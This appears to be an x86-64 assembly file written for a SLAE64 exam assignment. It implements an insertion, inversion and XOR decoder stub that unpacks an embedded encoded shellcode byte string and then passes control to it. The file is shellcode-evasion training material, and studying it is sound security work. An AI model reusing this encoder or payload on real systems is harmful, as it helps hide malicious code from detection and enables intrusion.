

;Exam Assignment 4
;Insertion Decoder
;Decode Shellcode encoded
;by the "Invertion_Insertion_Xor_encoder"
;Christophe G SLAE64 - 1337









global _start


_start:


jmp short Address
                   ; insertion decoder , Insertion Decode  replace byte of the shellcode correctly ("remove" inserted dummy bytes);
                   ;don' t forget all bytes is inversed the "dummy bytes" is in first after this loop


            InsertionDecoder:
                 pop rsi
                 xor rbx , rbx
                 xor rcx , rcx
                 lea rdi , [rsi + 1]
                 mov r9 , rsi                                ; store for RDI later

            InsertionDecode:
                 cmp byte [rdi + rax + 1] , 0xff             ; marker byte
                 jz Invdecoder
                 mov bl , byte [rdi + rax]
                 mov byte [rsi] , bl
                 add al , 0x2
                 inc rsi
                 jmp InsertionDecode


                  ; invertion decoder/decode replace the shellcode bytes correctly , dummy bytes go to the end

            Invdecoder:
                 mov rdi , r9
                 xor rbx , rbx
                 mov bl , 0x1f                              ;     len of the shellcode - 1 (in this case 32 - 1)
                 mov cl , 0x10                              ;     len of shellcode / 2 ,  lower round example if len of the shellcode == 33 , 33 / 2 = 16.5 -->
                                                            ;round to 16 == 0x10 if not correctly set this value
							    ;decodeur don't work (marker byte <<0xff>> issue , take a marker byte and move it in beginning)

                 xor rdx , rdx



            Invdecode:
                  mov dl , byte [rdi]
                  mov al , byte [rdi + rbx]
                  mov byte [rdi] , al
                  mov byte [rdi + rbx] ,  dl
                  dec bl
                  dec bl                        ; dec rbx 2 times don' t forget is a offset , if decreasing 1 time rbx "don' t move" because rdi is increasing
                  inc rdi
               loop Invdecode

            ;Xordecoder / xordecode ; unxor shellcode bytes with 0xbb


            Xordecoder:
                  mov rdi , r9
                  add cl , 0x22                             ; len of shellcode

            Xordecode:
                  xor byte[rdi] , 0xbb
                  inc rdi
                  loop Xordecode

               call r9                ; pass control to shellcode



         Address:
            call InsertionDecoder
                           shellcode : db 0x24,0xbe,0x63,0xb4,0x73,0x80,0x65,0x7b,0x2b,0x38,0x6f,0xf3,0x18,0x5d,0x39,0x32,0xb2,0xf3,0x1d,0xec,0x1f,0x59,0x3f,0x32,0x57,0xf3,0xd8,0xeb,0x7c,0x5c,0x45,0x32,0x18,0xf3,0x6a,0xe8,0xf6,0xd3,0xb6,0xc8,0x1e,0x94,0x86,0x94,0x04,0xd5,0x32,0xd2,0x1f,0xd9,0x06,0x94,0x40,0x00,0x78,0xf3,0x7b,0xeb,0xa7,0x7b,0x5a,0x8a,0xed,0xf3,0x2b,0xff,0xff

